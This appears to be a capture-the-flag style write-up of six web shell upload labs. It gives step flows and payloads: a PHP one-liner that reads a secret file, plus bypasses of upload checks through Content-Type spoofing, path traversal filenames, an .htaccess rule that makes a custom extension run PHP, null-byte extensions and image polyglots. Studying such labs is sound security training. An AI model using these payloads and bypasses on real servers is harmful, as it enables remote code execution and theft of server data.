### Remote code execution via web shell upload
**Flow** :
`Login -> create script php that retrieve flag -> change avatar -> upload -> see the image -> submit`
**Payload** :
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Web shell upload via Content-Type restriction bypass
**Flow** : 
`Login -> create script php that retrieve flag -> change avatar -> upload -> intercept -> change the 'Content-Type' to image/jpeg -> forward -> see the image -> submit`
**Payload** : ***Same as before***

### Web shell upload via path traversal
**Flow** :
`Login -> create script php that retrieve flag -> change avatar -> upload -> intercept -> change the value of 'filename' to '..%2fpayload.php' -> forward -> see the image -> submit`

### Web shell upload via extension blacklist bypass
**Flow** :
`Login -> create script php that retrieve flag -> change avatar -> upload -> intercept -> change the value of 'filename' to '.htaccess' -> change the body with apache configuration with allow another filetype running php (example .l33ts) -> forward -> upload payload php with extension .l33ts -> forward -> see the image -> submit`
**Payload** : 
`AddType application/x-httpd-php .l33ts

### Web shell upload via obfuscated file extension
**Flow** :
`Login -> create script php that retrieve flag -> change avatar -> upload -> intercept -> change the value of 'filename' to 'payload.php%00.jpg' -> forward -> see the image -> submit`
It could happen, because %00 is a null byte, that will ignore the next string

### Remote code execution via polyglot web shell upload
**Flow** :
`Login -> create script php that retrieve flag -> change avatar -> upload normal image (such as png) -> intercept -> delete the rest from certain byte -> input payload -> change the filename to php extension -> forward -> see the image -> submit`
The system only check the signature of image

